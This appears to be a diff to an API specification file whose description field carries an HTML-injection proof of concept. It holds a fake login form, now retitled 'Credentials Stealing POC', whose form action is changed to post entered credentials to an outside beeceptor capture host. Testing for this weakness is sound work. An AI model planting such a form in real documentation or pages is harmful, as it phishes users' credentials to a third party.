@@ -4,10 +4,10 @@ info:
   title: Fake Login Page
   description: '<div class="login-form">
     <div class="heading">
-        <marquee>HTML Injection : Fake Login</marquee>
+        <h1>Credentials Stealing POC : Fake Login</h1>
     </div>
     <div class="form-container">
-        <form action="https://example.com/login" method="post" class="form-signin">
+        <form action="https://vinothpentest.free.beeceptor.com/login" method="post" class="form-signin">
             <div class="form-group">
                 <label for="username">Username</label>
                 <input type="text" name="username" size="20">
